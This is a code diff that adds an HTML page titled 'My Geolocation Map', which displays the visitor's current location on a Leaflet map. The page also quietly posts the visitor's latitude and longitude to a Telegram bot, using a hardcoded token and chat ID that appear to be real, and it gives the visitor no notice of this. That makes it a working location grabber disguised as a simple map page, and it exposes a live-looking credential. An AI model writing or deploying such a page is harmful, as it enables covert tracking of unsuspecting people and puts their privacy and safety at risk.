@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>My Geolocation Map</title>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+    <style>
+        body {
+            text-align: center;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+        #map {
+            height: 80vh;
+            width: 80%;
+            margin: 0 auto;
+            border-radius: 15px;
+        }
+    </style>
+</head>
+
+<body>
+    <h1>My Geolocation Map</h1>
+    <div id="map"></div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            if ('geolocation' in navigator) {
+                navigator.geolocation.getCurrentPosition(success, error);
+            } else {
+                alert('Geolocation is not supported by your browser');
+            }
+
+            function success(position) {
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+
+                const mymap = L.map('map').setView([latitude, longitude], 15);
+
+                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                    attribution: '© OpenStreetMap contributors'
+                }).addTo(mymap);
+
+                L.marker([latitude, longitude]).addTo(mymap)
+                    .bindPopup('My Location')
+                    .openPopup();
+
+                // Send geolocation to Telegram
+                sendToTelegram(latitude, longitude);
+            }
+
+            function error() {
+                alert('Unable to retrieve your location');
+            }
+
+            function sendToTelegram(latitude, longitude) {
+                const botToken = '6517062675:AAF4CN46a9dHCJhWbDG2BcvOt8q5fIEOlOM'; // Replace with your actual bot token
+                const chatId = '6813400773'; // Replace with your actual chat ID
+
+                const apiUrl = `https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;
+
+                fetch(apiUrl, { method: 'POST' })
+                    .then(response => response.json())
+                    .then(data => console.log(data))
+                    .catch(error => console.error(error));
+            }
+        });
+    </script>
+</body>
+
+</html>
